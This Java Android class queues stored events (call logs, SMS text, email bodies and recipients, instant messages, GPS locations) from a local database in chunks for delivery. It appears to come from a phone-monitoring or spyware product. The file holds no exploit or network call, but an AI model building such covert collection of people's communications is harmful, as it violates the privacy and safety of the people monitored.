package com.fx.eventdb;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.fx.event.Event;
import com.fx.event.EventCall;
import com.fx.event.EventEmail;
import com.fx.event.EventIm;
import com.fx.event.EventLocation;
import com.fx.event.EventSms;
import com.fx.event.EventSystem;
import com.fx.maind.ref.Customization;
import com.fx.util.FxSettings;
import com.fx.util.FxUtil;
import com.vvt.logger.FxLog;

public class QueryEventsQueue extends EventQueue {
	
	private static final String TAG = "QueryEventsQueue";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private List<Event> mEventList;

	public QueryEventsQueue(Context context, Callback callback, List<Event> eventList) {
		super(context, callback);
		mEventList = eventList;
	}

	@Override
	public void run() {
		if (LOGV) FxLog.v(TAG, "run # ENTER ...");
		
		if (mEventList == null) {
			mEventList = new ArrayList<Event>();
		}
		
		mEventList.clear();
		
		int limit = 0;
		String limitSelection = null;
		List<Event> tempList;
		
		for (short eventType : Event.TYPES_LIST) {
			
			// Calculate offset value
			limit = FxSettings.getDeliveryEventsChunkLength() - mEventList.size();
			limitSelection = FxUtil.createSqlLimitSelection(null, limit);
			
			// Add events list
			Uri uri = mEventdbManager.getEventUri(eventType);
			
			Cursor cursor = mEventdbHelper.query(uri, null, limitSelection, null, null);
			
			if (LOGV) {
				if (cursor == null) {
					FxLog.v(TAG, "run # cursor is NULL!!"); 
					FxLog.v(TAG, String.format("run # current uri: %s", uri.toString()));
				}
				else {
					FxLog.v(TAG, String.format(
							"run # type=%d, size=%d", 
							eventType, cursor.getCount()));
				}
			}
			
			tempList = instantiateListOfEvent(eventType, cursor);
			mEventList.addAll(tempList);
			
			if (cursor != null) {
				cursor.close();
			}
			
			// Check the total number of events with the number to delivery
			if (mEventList.size() >= FxSettings.getDeliveryEventsChunkLength()) {
				if (LOGV) FxLog.v(TAG, "run # Reach delivery limited length!");
				break;
			}
		}
		
		notifyProcessDone();
		
		if (LOGV) FxLog.v(TAG, "run # EXIT ...");
	}
	
	private List<Event> instantiateListOfEvent(short eventType, Cursor cursor) {
		List<Event> list = new ArrayList<Event>();
		Event event = null;
		
		while (cursor.moveToNext()) {
			event = getInstantiatedEvent(eventType, cursor);
			
			// An event must not in pending list
			if (event != null) {
				list.add(event);
			}
		}
		return list;
	}
	
	private Event getInstantiatedEvent(short eventType, Cursor cursor) {
		switch (eventType) {
			case Event.TYPE_CALL:
				return instantiateEventCall(cursor);
			case Event.TYPE_SMS:
				return instantiateEventSms(cursor);
			case Event.TYPE_EMAIL: 
				return instantiateEventEmail(cursor);
			case Event.TYPE_LOCATION:
				return instantiateEventLocation(cursor);
			case Event.TYPE_IM:
				return instantiateEventIm(cursor);
			case Event.TYPE_SYSTEM:
				return instantiateEventSystem(cursor);
			default:
				return null;
		}
	}
	
	private EventCall instantiateEventCall(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		String timeInitiated = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.TIME_INITIATED));
		String timeConnected = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.TIME_CONNECTED));
		String timeTerminated = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.TIME_TERMINATED));
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.DIRECTION));
		int durationSeconds = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.DURATION_SECONDS));
		String phonenumber = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.PHONENUMBER));
		int status = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.STATUS));
		String contactName = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.CONTACT_NAME));
		
		return new EventCall(rowId, identifier, sendAttempts, 
				timeInitiated, timeConnected, timeTerminated,
				direction, durationSeconds, phonenumber, status, contactName);
	}
	
	private EventSms instantiateEventSms(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		String time = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.TIME));
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.DIRECTION));
		String phonenumber = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.PHONENUMBER));
		String data = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.DATA));
		String contactName = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.CONTACT_NAME));
		
		return new EventSms (rowId, identifier, sendAttempts, 
				time, direction, phonenumber, data, contactName);
	}
	
	private EventEmail instantiateEventEmail(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		
		String time = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.TIME));
		
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.DIRECTION));
		
		int size = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.SIZE));
		
		String sender = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.SENDER));
		
		String to = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.TO));
		
		String cc = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.CC));
		
		String bcc = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.BCC));
		
		String subject = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.SUBJECT));
		
		String attachments = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.ATTACHMENTS));
		
		String body = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.BODY));
		
		String contact = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.CONTACT_NAME));
		
		String[] toArray = to == null || to.length() < 1? null: to.split(", ");
		String[] ccArray = cc == null || cc.length() < 1? null: cc.split(", ");
		String[] bccArray = bcc == null || bcc.length() < 1? null: bcc.split(", ");
		String[] attachmentsArray =
			attachments == null || attachments.length() < 1? null: attachments.split(", ");
		
		
		return new EventEmail(rowId, identifier, sendAttempts, 
				time, direction, size, sender, toArray, ccArray, bccArray, 
				subject, attachmentsArray, body, contact);
	}
	
	private EventLocation instantiateEventLocation(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		String time  = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.TIME));
		double latitude = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.LATITUDE));
		double longitude = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.LONGITUDE));
		double altitude = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.ALTITUDE));
		double horizontalAccuracy = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.HORIZONTAL_ACCURACY));
		double verticalAccuracy = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.VERTICAL_ACCURACY));
		String provider = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.PROVIDER));
		
		return new EventLocation(rowId, identifier, sendAttempts, 
				time, latitude, longitude, altitude, 
				horizontalAccuracy, verticalAccuracy, provider);
	}
	
	private EventIm instantiateEventIm(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		
		String time = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.TIME));
		
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.DIRECTION));
		
		String service = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.SERVICE));
		
		String username = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.USERNAME));
		
		String speakerName = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.SPEAKER_NAME));
		
		String contactUids = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.PARTICIPANT_UIDS));
		
		String contactNames = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.PARTICIPANT_NAMES));
		
		String data = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.IM.DATA));
		
		String[] contactUidsArray = contactUids == null || contactUids.length() < 1 ? 
				null: contactUids.split(", ");
		
		String[] contactNamesArray = contactNames == null || contactNames.length() < 1 ? 
				null: contactNames.split(", ");
		
		return new EventIm(rowId, identifier, sendAttempts, 
				time, direction, service, username, speakerName, 
				contactUidsArray, contactNamesArray, data);
	}
	
	private EventSystem instantiateEventSystem(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		String time = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.System.TIME));
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.System.DIRECTION));
		String data = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.System.DATA));
		
		return new EventSystem(rowId, identifier, sendAttempts, time, direction, data);
	}

}
